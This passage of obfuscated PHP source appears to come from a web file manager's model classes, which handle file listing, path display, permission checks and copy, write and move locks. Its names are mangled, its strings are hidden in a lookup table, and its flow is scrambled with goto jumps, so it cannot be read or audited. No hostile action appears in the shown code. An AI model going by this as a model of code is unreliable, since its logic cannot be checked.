(isset($Dæ†ÃÒˆ¶´[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]])) { $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[473]] = array(); foreach ($Dæ†ÃÒˆ¶´[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]] as $eÑÚ·½¶Ã) { $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[473]] = array($aï¦´¥ù·«[474] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[475]], $aï¦´¥ù·«[476] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[477]], $aï¦´¥ù·«[478] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[403]], $aï¦´¥ù·«[479] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[480]], $aï¦´¥ù·«[481] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[482]], $aï¦´¥ù·«[483] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[483]], $aï¦´¥ù·«[484] => $eÑÚ·½¶Ã[$aï¦´¥ù·«[484]]); } } } unset($cŠĞÉø÷”); goto D²Á”Ş; fœ‡çŒ¬: $aï¦´¥ù·« =& $_SERVER[Šº]; if (!defined($aï¦´¥ù·«[461])) { return; } $B”ÎóÆµò = Model($aï¦´¥ù·«[462])->listData(); goto A« å”œ…“; D²Á”Ş: return $c²õ× ’Å¨; goto f œØ§ËÉ­; A« å”œ…“: $D‚‰³±÷ = Model($aï¦´¥ù·«[425])->listData(); $cæ÷ÃÃÕ‹ = Model($aï¦´¥ù·«[415])->listData(); $bãÕÇ†¦Õ = Model($aï¦´¥ù·«[463])->listSimple(); goto f¨¾ÇÈ½·ä; f¨¾ÇÈ½·ä: $aŸ—Š›óùã = array_to_keyvalue($B”ÎóÆµò, $aï¦´¥ù·«[392]); $bßƒÚö‚Òâ = array_to_keyvalue_group($D‚‰³±÷, $aï¦´¥ù·«[76], $aï¦´¥ù·«[426]); $Bî¾„ÔÅÕ¨ = array_to_keyvalue($cæ÷ÃÃÕ‹, $aï¦´¥ù·«[76]); goto a±°‹Ùô—¶; f œØ§ËÉ­: } protected function _listAppendChildren(&$CäŸÍÊÆ¹×, $c†”ì½‡Œ) { goto Eí’ø‹ù÷Ö; c˜‘™‹×Íæ: $F“ƒĞŞ©— = array($A…ŠÚÒĞ•à[485] => array($A…ŠÚÒĞ•à[7], $F¾Şôòƒ“œ)); $b¤ø¼²‹°ñ = array($A…ŠÚÒĞ•à[485], $A…ŠÚÒĞ•à[410], $A…ŠÚÒĞ•à[486] => $A…ŠÚÒĞ•à[487]); $CĞÂ¤„¼‡µ = $this->field($b¤ø¼²‹°ñ)->where($F“ƒĞŞ©—)->group($A…ŠÚÒĞ•à[488])->select(); goto a•¬ˆ°Š›ƒ; a•¬ˆ°Š›ƒ: $fİÜµõª³• = array(); foreach ($CĞÂ¤„¼‡µ as $AÁÓñù•çµ) { $c¤“¹òÎƒá = $AÁÓñù•çµ[$A…ŠÚÒĞ•à[485]]; $AàÇ¬ëìÖâ = $AÁÓñù•çµ[$A…ŠÚÒĞ•à[410]] == $A…ŠÚÒĞ•à[87] ? $A…ŠÚÒĞ•à[203] : $A…ŠÚÒĞ•à[202]; if (!isset($fİÜµõª³•[$c¤“¹òÎƒá])) { $fİÜµõª³•[$c¤“¹òÎƒá] = array($A…ŠÚÒĞ•à[202] => 0, $A…ŠÚÒĞ•à[203] => 0); } $fİÜµõª³•[$c¤“¹òÎƒá][$AàÇ¬ëìÖâ] += $AÁÓñù•çµ[$A…ŠÚÒĞ•à[487]]; } foreach ($CäŸÍÊÆ¹× as &$AË´¤™×Ôæ) { if (!$AË´¤™×Ôæ[$A…ŠÚÒĞ•à[410]]) { continue; } $Fßêàç…íÛ = is_array($fİÜµõª³•[$AË´¤™×Ôæ[$A…ŠÚÒĞ•à[403]]]) ? $fİÜµõª³•[$AË´¤™×Ôæ[$A…ŠÚÒĞ•à[403]]] : $FœØÒ°Ùù; $AË´¤™×Ôæ[$A…ŠÚÒĞ•à[203]] = $Fßêàç…íÛ[$A…ŠÚÒĞ•à[203]]; $AË´¤™×Ôæ[$A…ŠÚÒĞ•à[202]] = $Fßêàç…íÛ[$A…ŠÚÒĞ•à[202]]; unset($AË´¤™×Ôæ[$A…ŠÚÒĞ•à[412]]); } goto EÖÃÉ§ôœ¿; EÖÃÉ§ôœ¿: unset($AË´¤™×Ôæ); goto bÇ÷ôëÕ±; F¹»­Àº¢Ï: foreach ($CäŸÍÊÆ¹× as &$AË´¤™×Ôæ) { if (!$AË´¤™×Ôæ[$A…ŠÚÒĞ•à[410]]) { continue; } $F¾Şôòƒ“œ[] = $AË´¤™×Ôæ[$A…ŠÚÒĞ•à[403]]; } unset($AË´¤™×Ôæ); if (!$F¾Şôòƒ“œ) { return; } goto c˜‘™‹×Íæ; Eí’ø‹ù÷Ö: $A…ŠÚÒĞ•à =& $_SERVER[Šº]; $F¾Şôòƒ“œ = array(); $FœØÒ°Ùù = array($A…ŠÚÒĞ•à[202] => 0, $A…ŠÚÒĞ•à[203] => 0); goto F¹»­Àº¢Ï; bÇ÷ôëÕ±: } protected function _listAppendAuth(&$dÇØÌ†Î¨‘) { goto d£‚¢…Å™; d£‚¢…Å™: $dÓ¯¼è‰…Ÿ =& $_SERVER[Šº]; if (!defined($dÓ¯¼è‰…Ÿ[461])) { return; } $d²Ì½õ­É› = array(); goto C³Ë¦»ÛŸØ; D–˜¸ö†ˆÖ: $fÀâ¡¨¯Ü = Model($dÓ¯¼è‰…Ÿ[489])->getSourceList($d²Ì½õ­É›, $FÁ‚İš—œ); foreach ($dÇØÌ†Î¨‘ as $b›Š™‘”˜“ => &$DÛ—®íŠ¶Š) { $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]] = $fÀâ¡¨¯Ü[$DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[403]]]; if (!$DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]] && $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[411]] == self::TYPE_GROUP) { $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]] = Action($dÓ¯¼è‰…Ÿ[490])->pathGroupAuthMake($DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[491]]); if (!$DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]] && !_get($GLOBALS, $dÓ¯¼è‰…Ÿ[492])) { $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[195]] = !1; $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[194]] = !1; } } if ($DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]]) { $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[195]] = AuthModel::authCheckEdit($DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]][$dÓ¯¼è‰…Ÿ[414]]); $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[194]] = AuthModel::authCheckView($DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[413]][$dÓ¯¼è‰…Ÿ[414]]); } $this->groupPathDisplay($DÛ—®íŠ¶Š); } unset($DÛ—®íŠ¶Š); goto B°ïÎÆ„âƒ; C³Ë¦»ÛŸØ: foreach ($dÇØÌ†Î¨‘ as $DÛ—®íŠ¶Š) { if ($DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[411]] == self::TYPE_GROUP) { $d²Ì½õ­É›[] = $DÛ—®íŠ¶Š[$dÓ¯¼è‰…Ÿ[403]]; } } if (!$d²Ì½õ­É›) { return; } $FÁ‚İš—œ = array_to_keyvalue($dÇØÌ†Î¨‘, $dÓ¯¼è‰…Ÿ[403]); goto D–˜¸ö†ˆÖ; B°ïÎÆ„âƒ: } public function groupPathDisplay(&$a—½¦Ôœ) { goto e£‰çÙ†‚‚; A—¦µÒÑ°: $a—½¦Ôœ[$FššÒ­ä©[499]] = $eòù‘Ù°À . $f°ƒ ¬¦Å¿[$FššÒ­ä©[85]][$FššÒ­ä©[403]]; goto eìÔùö¡‘; bÒô¶İÌƒç: $a—½¦Ôœ[$FššÒ­ä©[495]] = $f°ƒ ¬¦Å¿[$FššÒ­ä©[485]]; $a—½¦Ôœ[$FššÒ­ä©[496]] = $f°ƒ ¬¦Å¿[$FššÒ­ä©[494]]; $a—½¦Ôœ[$FššÒ­ä©[497]] = $f°ƒ ¬¦Å¿[$FššÒ­ä©[498]]; goto A—¦µÒÑ°; e£‰çÙ†‚‚: $FššÒ­ä© =& $_SERVER[Šº]; if ($a—½¦Ôœ[$FššÒ­ä©[411]] != self::TYPE_GROUP) { return; } $f°ƒ ¬¦Å¿ = Model($FššÒ­ä©[493])->getInfo($a—½¦Ôœ[$FššÒ­ä©[491]]); goto CÉÈšªğÎ¸; CÉÈšªğÎ¸: $e‹÷ËÚ•º = $this->parentLevelArray($f°ƒ ¬¦Å¿[$FššÒ­ä©[494]]); $eòù‘Ù°À = $FššÒ­ä©[33]; foreach ($e‹÷ËÚ•º as $d˜‘™Îëˆ) { $bØó‹İÖ = Model($FššÒ­ä©[493])->getInfo($d˜‘™Îëˆ); $eòù‘Ù°À .= $bØó‹İÖ[$FššÒ­ä©[85]][$FššÒ­ä©[403]] . $FššÒ­ä©[47]; } goto bÒô¶İÌƒç; eìÔùö¡‘: } protected function _listAppendPath(&$FğŞáÙ¶ğ¥) { goto dÓÜË™õÈ; f‹ƒÃ§È™: $Fç¿˜ÇìØ– = array_unique($Fç¿˜ÇìØ–); if (count($Fç¿˜ÇìØ–) > 0) { $dÙ¨ÅŸ£Œ” = array($Eğå×Ä¶ŒÔ[417] => array($Eğå×Ä¶ŒÔ[418], $Fç¿˜ÇìØ–)); if (count($Fç¿˜ÇìØ–) == 1) { $Fî¹®­À´¯ = $this->sourceInfo($Fç¿˜ÇìØ–[0]); $Bß”ªö½ª± = is_array($Fî¹®­À´¯) ? array($Fî¹®­À´¯) : !1; } else { $Bß”ªö½ª± = $this->field($Eğå×Ä¶ŒÔ[500])->where($dÙ¨ÅŸ£Œ”)->select(); } if (!$Bß”ªö½ª±) { $Bß”ªö½ª± = array(); } foreach ($Bß”ªö½ª± as $CäÒôÄµÎº) { $eÓçµ‘¥Û[$CäÒôÄµÎº[$Eğå×Ä¶ŒÔ[403]]] = $CäÒôÄµÎº[$Eğå×Ä¶ŒÔ[28]]; } } $FÉê‡êºÛí = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto A ÆÌÊÕ‘¸; A©• ö : unset($a©ßõõÑô´); return $FğŞáÙ¶ğ¥; goto E‰÷ª–×“‡; A ÆÌÊÕ‘¸: $Aà’¶ÔŒ´ = array(); $Cº¿¿°µÊ = array(); foreach ($FğŞáÙ¶ğ¥ as &$a©ßõõÑô´) { goto dĞ‚åóã§†; dĞ‚åóã§†: $Eé¢¡æôñ = $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[494]]; if (isset($Cº¿¿°µÊ[$Eé¢¡æôñ])) { $BŞë·¦ÁÉÑ = $Aà’¶ÔŒ´[$Eé¢¡æôñ]; } else { $Fø£·©ÎÀ• = $this->parentLevelArray($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[494]]); $d„ˆŞ´Ù…‰ = $Eğå×Ä¶ŒÔ[501] . $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[411]] . $Eğå×Ä¶ŒÔ[447] . $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[491]]; if ($Aà’¶ÔŒ´[$d„ˆŞ´Ù…‰]) { $BŞë·¦ÁÉÑ = $Aà’¶ÔŒ´[$d„ˆŞ´Ù…‰]; } else { $BŞë·¦ÁÉÑ = $this->_listAppendPathRoot($a©ßõõÑô´, $Fø£·©ÎÀ•); $Aà’¶ÔŒ´[$d„ˆŞ´Ù…‰] = $BŞë·¦ÁÉÑ; } foreach ($Fø£·©ÎÀ• as $AÒ¤Ò·¹Ãô => $DÔ˜ÒŞ×ø×) { if ($AÒ¤Ò·¹Ãô == 0 && $BŞë·¦ÁÉÑ && $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[411]] == self::TYPE_GROUP) { continue; } if (isset($eÓçµ‘¥Û[$DÔ˜ÒŞ×ø×])) { $BŞë·¦ÁÉÑ .= $eÓçµ‘¥Û[$DÔ˜ÒŞ×ø×] . $Eğå×Ä¶ŒÔ[8]; } } if ($Fø£·©ÎÀ•) { $BŞë·¦ÁÉÑ .= $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[28]]; } $Aà’¶ÔŒ´[$Eé¢¡æôñ] = $BŞë·¦ÁÉÑ; } if ($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[410]]) { $BŞë·¦ÁÉÑ .= $Eğå×Ä¶ŒÔ[8]; } goto Bš©ä˜ËÆ’; CÂ“‘´èç: if (intval($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($a©ßõõÑô´, $Fø£·©ÎÀ•, $FÉê‡êºÛí); } goto D“Îï÷ô‘†; Bš©ä˜ËÆ’: $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[502]] = str_replace($Eğå×Ä¶ŒÔ[503], $Eğå×Ä¶ŒÔ[8], $BŞë·¦ÁÉÑ); $E ‰×İğƒÊ = trim($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[502]], $Eğå×Ä¶ŒÔ[8]); if ($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[485]] == $Eğå×Ä¶ŒÔ[504] && $E ‰×İğƒÊ) { $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[28]] = $E ‰×İğƒÊ; } goto CÂ“‘´èç; D“Îï÷ô‘†: } goto A©• ö ; dÓÜË™õÈ: $Eğå×Ä¶ŒÔ =& $_SERVER[Šº]; static $eÓçµ‘¥Û = array(); $Fç¿˜ÇìØ– = array(); goto E àˆÌ™ÛÍ; E àˆÌ™ÛÍ: $dê¤‚ìšìÂ = array(); foreach ($FğŞáÙ¶ğ¥ as &$a©ßõõÑô´) { $EšÚÒ«ŒÑµ = $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[410]] == $Eğå×Ä¶ŒÔ[87]; if ($EšÚÒ«ŒÑµ) { $eÓçµ‘¥Û[$a©ßõõÑô´[$Eğå×Ä¶ŒÔ[403]]] = $a©ßõõÑô´[$Eğå×Ä¶ŒÔ[28]]; } if (isset($dê¤‚ìšìÂ[$a©ßõõÑô´[$Eğå×Ä¶ŒÔ[494]]])) { continue; } $dê¤‚ìšìÂ[$a©ßõõÑô´[$Eğå×Ä¶ŒÔ[494]]] = !0; $Fø£·©ÎÀ• = $this->parentLevelArray($a©ßõõÑô´[$Eğå×Ä¶ŒÔ[494]]); foreach ($Fø£·©ÎÀ• as $AÒ¤Ò·¹Ãô => $DÔ˜ÒŞ×ø×) { if ($AÒ¤Ò·¹Ãô != 0 && !isset($eÓçµ‘¥Û[$DÔ˜ÒŞ×ø×])) { $Fç¿˜ÇìØ–[] = $DÔ˜ÒŞ×ø×; } } } unset($a©ßõõÑô´); goto f‹ƒÃ§È™; E‰÷ª–×“‡: } private function _listAppendPathRecycle(&$AÒ…À´ßÚÓ, $b‘Ó¤ô«ŒÎ, $d‹ƒ›¾˜š) { goto dğ¯ßĞğ‹Ã; FÂã«ÄÚ´õ: if ($AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[403]] == $d‹ƒ›¾˜š) { $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[494]] = $EšÃˆÊ¥‰Œ[506]; $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[485]] = $EšÃˆÊ¥‰Œ[504]; $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[28]] = LNG($EšÃˆÊ¥‰Œ[505]); } $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[507]] = $EšÃˆÊ¥‰Œ[508]; goto Eº—¾œÑåï; dğ¯ßĞğ‹Ã: $EšÃˆÊ¥‰Œ =& $_SERVER[Šº]; if (!in_array($d‹ƒ›¾˜š, $b‘Ó¤ô«ŒÎ) && $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[403]] != $d‹ƒ›¾˜š) { return; } $Cäºš°È = explode($EšÃˆÊ¥‰Œ[8], trim($AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[502]], $EšÃˆÊ¥‰Œ[8])); goto cËÓ›Ãã›Ş; cËÓ›Ãã›Ş: $fî¸×ƒ“òá = implode($EšÃˆÊ¥‰Œ[8], array_slice($Cäºš°È, 2)); $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[502]] = $EšÃˆÊ¥‰Œ[8] . LNG($EšÃˆÊ¥‰Œ[505]) . $EšÃˆÊ¥‰Œ[8] . ltrim($fî¸×ƒ“òá, $EšÃˆÊ¥‰Œ[8]); $AÒ…À´ßÚÓ[$EšÃˆÊ¥‰Œ[494]] = $EšÃˆÊ¥‰Œ[506] . implode($EšÃˆÊ¥‰Œ[47], array_slice($b‘Ó¤ô«ŒÎ, 1)) . $EšÃˆÊ¥‰Œ[47]; goto FÂã«ÄÚ´õ; Eº—¾œÑåï: } protected function _listAppendPathRoot(&$cµÓÔ“Ğ“, $E–ì¥„±É) { $fä¬åŸ©„ =& $_SERVER[Šº]; $AÒ§‰Å©»÷ = $fä¬åŸ©„[33]; if ($cµÓÔ“Ğ“[$fä¬åŸ©„[411]] == self::TYPE_USER) { if (defined($fä¬åŸ©„[461]) && $cµÓÔ“Ğ“[$fä¬åŸ©„[491]] == USER_ID) { $AÒ§‰Å©»÷ = LNG($fä¬åŸ©„[509]); if (!$E–ì¥„±É) { $cµÓÔ“Ğ“[$fä¬åŸ©„[28]] = $AÒ§‰Å©»÷; } } else { $a²ïŠßŠÖ° = Model($fä¬åŸ©„[510])->getInfoSimple($cµÓÔ“Ğ“[$fä¬åŸ©„[491]]); $AÒ§‰Å©»÷ = LNG($fä¬åŸ©„[511]) . $fä¬åŸ©„[160] . $a²ïŠßŠÖ°[$fä¬åŸ©„[28]] . $fä¬åŸ©„[512]; } } else { if ($cµÓÔ“Ğ“[$fä¬åŸ©„[411]] == self::TYPE_GROUP) { $a²ïŠßŠÖ° = Model($fä¬åŸ©„[493])->getInfoSimple($cµÓÔ“Ğ“[$fä¬åŸ©„[491]]); $AÒ§‰Å©»÷ = $a²ïŠßŠÖ°[$fä¬åŸ©„[28]]; } else { if ($cµÓÔ“Ğ“[$fä¬åŸ©„[411]] == self::TYPE_SYSTEM) { $AÒ§‰Å©»÷ = $fä¬åŸ©„[513]; } } } $AÒ§‰Å©»÷ = $AÒ§‰Å©»÷ ? $fä¬åŸ©„[8] . $AÒ§‰Å©»÷ . $fä¬åŸ©„[8] : $fä¬åŸ©„[8]; return $AÒ§‰Å©»÷; } protected function _listAppendUser(&$dÂĞÄ±Ë‡¶) { goto BĞÂÌŞ‰˜ö; Eª¨°Œ†‡¢: $c¿ÈùÊÛÙ“ = array_merge($E½éÖ„Î™µ, $f‘Ëïòè®Ì); $F·¢…±·±‘ = Model($eÔäÅÖß[514])->userListInfo($c¿ÈùÊÛÙ“); foreach ($dÂĞÄ±Ë‡¶ as &$Bç‹õŠ‹¦•) { $c ç«ŞĞÑ = $Bç‹õŠ‹¦•[$eÔäÅÖß[439]]; $Bç‹õŠ‹¦•[$eÔäÅÖß[439]] = $F·¢…±·±‘[$c ç«ŞĞÑ] ? $F·¢…±·±‘[$c ç«ŞĞÑ] : !1; $c ç«ŞĞÑ = $Bç‹õŠ‹¦•[$eÔäÅÖß[441]]; $Bç‹õŠ‹¦•[$eÔäÅÖß[441]] = $F·¢…±·±‘[$c ç«ŞĞÑ] ? $F·¢…±·±‘[$c ç«ŞĞÑ] : !1; if (isset($Bç‹õŠ‹¦•[$eÔäÅÖß[452]]) && $Bç‹õŠ‹¦•[$eÔäÅÖß[452]][$eÔäÅÖß[515]]) { $e±îÒíâ–× = $GLOBALS[$eÔäÅÖß[6]][$eÔäÅÖß[88]][$eÔäÅÖß[516]]; if ($Bç‹õŠ‹¦•[$eÔäÅÖß[452]][$eÔäÅÖß[517]] <= time() - $e±îÒíâ–×) { $this->metaSet($Bç‹õŠ‹¦•[$eÔäÅÖß[403]], $eÔäÅÖß[515], null); $this->metaSet($Bç‹õŠ‹¦•[$eÔäÅÖß[403]], $eÔäÅÖß[517], null); unset($Bç‹õŠ‹¦•[$eÔäÅÖß[452]][$eÔäÅÖß[515]]); continue; } $b–í…Ô»– = $Bç‹õŠ‹¦•[$eÔäÅÖß[452]][$eÔäÅÖß[515]]; $Bç‹õŠ‹¦•[$eÔäÅÖß[452]][$eÔäÅÖß[518]] = Model($eÔäÅÖß[514])->getInfoSimpleOuter($b–í…Ô»–); } } goto B¾óˆãŠÜÑ; B¾óˆãŠÜÑ: unset($Bç‹õŠ‹¦•); goto B×¸ùÕ³âİ; BĞÂÌŞ‰˜ö: $eÔäÅÖß =& $_SERVER[Šº]; $E½éÖ„Î™µ = array_to_keyvalue($dÂĞÄ±Ë‡¶, $eÔäÅÖß[33], $eÔäÅÖß[439]); $f‘Ëïòè®Ì = array_to_keyvalue($dÂĞÄ±Ë‡¶, $eÔäÅÖß[33], $eÔäÅÖß[441]); goto Eª¨°Œ†‡¢; B×¸ùÕ³âİ: } public function parentLevelArray($A“ŒááÃ…¯) { $fø“¬í§Éç =& $_SERVER[Šº]; $A“ŒááÃ…¯ = explode($fø“¬í§Éç[47], trim($A“ŒááÃ…¯, $fø“¬í§Éç[47])); return array_remove_value($A“ŒááÃ…¯, $fø“¬í§Éç[504]); } public function listAll($A¸—î¿†¼Á) { goto AÚÆÂ‹òÉ™; A†ª‘‹Éœ²: $c£’…•¼Ğ† = array(); foreach ($F†¬ğ‡Å¾ as $a†‚ïÉ“… => $A¼ó»‘®ñ) { goto A‡Œßí²Îâ; C„ÛÄø‚é¯: if (!$A¼ó»‘®ñ[$bãÏù¢ê¯ë[410]]) { $eØ±àèÜø´[$bãÏù¢ê¯ë[454]] = $A¼ó»‘®ñ[$bãÏù¢ê¯ë[454]]; $eØ±àèÜø´[$bãÏù¢ê¯ë[86]] = $A¼ó»‘®ñ[$bãÏù¢ê¯ë[76]]; } $c£’…•¼Ğ†[] = $eØ±àèÜø´; goto D†£¾‡œÇî; D“Ó÷¶õ‹: for ($fÓÓáã†¡Ê = 0; $fÓÓáã†¡Ê < count($BÍ¶×íª¥); $fÓÓáã†¡Ê++) { $dºæù¬šòæ .= $F†¬ğ‡Å¾[$BÍ¶×íª¥[$fÓÓáã†¡Ê]][$bãÏù¢ê¯ë[28]] . $bãÏù¢ê¯ë[8]; } $dºæù¬šòæ .= $A¼ó»‘®ñ[$bãÏù¢ê¯ë[28]]; if ($A¼ó»‘®ñ[$bãÏù¢ê¯ë[410]]) { $dºæù¬šòæ .= $bãÏù¢ê¯ë[8]; } goto fÊê¨ªƒ×ô; A‡Œßí²Îâ: $BÍ¶×íª¥ = $this->parentLevelArray($A¼ó»‘®ñ[$bãÏù¢ê¯ë[494]]); array_shift($BÍ¶×íª¥); $dºæù¬šòæ = $eˆ‡ÓÜäÕ¬; goto D“Ó÷¶õ‹; fÊê¨ªƒ×ô: $dºæù¬šòæ = str_replace($bãÏù¢ê¯ë[503], $bãÏù¢ê¯ë[8], $dºæù¬šòæ); $dºæù¬šòæ = str_replace($bãÏù¢ê¯ë[503], $bãÏù¢ê¯ë[8], $dºæù¬šòæ); $eØ±àèÜø´ = array($bãÏù¢ê¯ë[421] => str_replace($bãÏù¢ê¯ë[503], $bãÏù¢ê¯ë[8], $dºæù¬šòæ), $bãÏù¢ê¯ë[525] => intval($A¼ó»‘®ñ[$bãÏù¢ê¯ë[410]]), $bãÏù¢ê¯ë[85] => $this->pathInfoFilter($A¼ó»‘®ñ)); goto C„ÛÄø‚é¯; D†£¾‡œÇî: } return $c£’…•¼Ğ†; goto cá·£Ò§İ; cÛÔ«ˆ: $bñ‡ÁÚ¢¼¡ = $bãÏù¢ê¯ë[523]; $BŒ¢öĞ†œ = "\114\x45\x46\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\154\x65\x20\146\x69\154\x65\x20\x6f\156\x20\x73\157\165\162\x63\x65\x2e\146\151\154\145\111\x44\x20\x3d\40\146\151\x6c\x65\x2e\146\x69\154\145\x49\x44"; $F†¬ğ‡Å¾ = $this->alias($bãÏù¢ê¯ë[524])->field($bñ‡ÁÚ¢¼¡)->where($cë»ä›·š½)->join($BŒ¢öĞ†œ)->select(); goto bÕ­™œ‡¯à; AÚÆÂ‹òÉ™: $bãÏù¢ê¯ë =& $_SERVER[Šº]; $Fíœ¤…” = $this->sourceInfo($A¸—î¿†¼Á); $cë»ä›·š½ = array($bãÏù¢ê¯ë[519] => array($bãÏù¢ê¯ë[520], $Fíœ¤…”[$bãÏù¢ê¯ë[494]] . $A¸—î¿†¼Á . $bãÏù¢ê¯ë[521]), $bãÏù¢ê¯ë[522] => 0); goto cÛÔ«ˆ; bÕ­™œ‡¯à: $this->_listAppendAuth($F†¬ğ‡Å¾); $this->_listAppendUser($F†¬ğ‡Å¾); $this->_listAppendPath($F†¬ğ‡Å¾); goto d¹É°è¢ÇÃ; d¹É°è¢ÇÃ: $F†¬ğ‡Å¾ = array_to_keyvalue($F†¬ğ‡Å¾, $bãÏù¢ê¯ë[403]); $eˆ‡ÓÜäÕ¬ = "\57{$Fíœ¤…”[$bãÏù¢ê¯ë[28]]}\x2f"; $eˆ‡ÓÜäÕ¬ = $eˆ‡ÓÜäÕ¬ == $bãÏù¢ê¯ë[503] ? $bãÏù¢ê¯ë[8] : $eˆ‡ÓÜäÕ¬; goto A†ª‘‹Éœ²; cá·£Ò§İ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($DõŞ¬áğñŒ) { goto aƒœ¶›“æ; D÷¿¾ó‰½: $F’ß´¤çµ = 1; $this->_lockEvent($DõŞ¬áğñŒ, array($fˆäƒ±°¸š[527], $fˆäƒ±°¸š[528]), $F’ß´¤çµ); $this->_lockParent($DõŞ¬áğñŒ, array($fˆäƒ±°¸š[528]), $F’ß´¤çµ); goto C³õìÑÀö†; C³õìÑÀö†: $this->_lockEvent($DõŞ¬áğñŒ, array($fˆäƒ±°¸š[529], $fˆäƒ±°¸š[530]), $F’ß´¤çµ); $this->_lockCheckEnd($fˆäƒ±°¸š[526], $DõŞ¬áğñŒ); goto FøÜ¢²Ïí; aƒœ¶›“æ: $fˆäƒ±°¸š =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $this->_lockCheck($fˆäƒ±°¸š[526], $DõŞ¬áğñŒ); goto D÷¿¾ó‰½; FøÜ¢²Ïí: } public function lockCopyEnd($CŞ¯ÑªÄ§ô) { $EÈœ†¹°“ =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $BÃÍÈôéÉ® = 0; $this->_lockEvent($CŞ¯ÑªÄ§ô, array($EÈœ†¹°“[527], $EÈœ†¹°“[528]), $BÃÍÈôéÉ®); $this->_lockParent($CŞ¯ÑªÄ§ô, array($EÈœ†¹°“[528]), $BÃÍÈôéÉ®); $this->_lockEvent($CŞ¯ÑªÄ§ô, array($EÈœ†¹°“[529], $EÈœ†¹°“[530]), $BÃÍÈôéÉ®); } public function lockWriteStart($dÛŒ‹¢¥Ï„, $bŞ˜Œ‰—Õä = '') { goto C»ÅÁ¡¿¶; C»ÅÁ¡¿¶: $Cì‡§õï‘‚ =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $this->_lockCheck($Cì‡§õï‘‚[527], $dÛŒ‹¢¥Ï„); goto EĞ³¤Œ‡¢™; fßŞ‡ùÛ—É: $this->_lockParent($dÛŒ‹¢¥Ï„, array($Cì‡§õï‘‚[526], $Cì‡§õï‘‚[528]), $F¶Æ¨„æ’“); $this->_lockCheckEnd($Cì‡§õï‘‚[527], $dÛŒ‹¢¥Ï„); goto cßº”ĞÄ¡; EĞ³¤Œ‡¢™: $F¶Æ¨„æ’“ = 1; $this->_lockKey($Cì‡§õï‘‚[531] . $dÛŒ‹¢¥Ï„ . $Cì‡§õï‘‚[95] . $bŞ˜Œ‰—Õä, $F¶Æ¨„æ’“); $this->_lockEvent($dÛŒ‹¢¥Ï„, array($Cì‡§õï‘‚[526], $Cì‡§õï‘‚[528]), $F¶Æ¨„æ’“); goto fßŞ‡ùÛ—É; cßº”ĞÄ¡: } public function lockWriteEnd($eë “æ¿´Ô, $D®«–ŒÌŠÉ = '') { $Eò±†ù‚‘³ =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $cµ­ßº = 0; $this->_lockKey($Eò±†ù‚‘³[531] . $eë “æ¿´Ô . $Eò±†ù‚‘³[95] . $D®«–ŒÌŠÉ, $cµ­ßº); $this->_lockEvent($eë “æ¿´Ô, array($Eò±†ù‚‘³[526], $Eò±†ù‚‘³[528]), $cµ­ßº); $this->_lockParent($eë “æ¿´Ô, array($Eò±†ù‚‘³[526], $Eò±†ù‚‘³[528]), $cµ­ßº); } public function lockMoveStart($CŠÂàÑ›÷¯) { goto dí•ŠµØ¥ï; a•ª ÇÃØÓ: $eº†Æš—è = 1; $this->_lockKey($eã·„ …Ö[532] . $CŠÂàÑ›÷¯, $eº†Æš—è); $this->_lockEvent($CŠÂàÑ›÷¯, array($eã·„ …Ö[526], $eã·„ …Ö[527]), $eº†Æš—è); goto Fˆ­°ñìëÁ; Fˆ­°ñìëÁ: $this->_lockParent($CŠÂàÑ›÷¯, array($eã·„ …Ö[526], $eã·„ 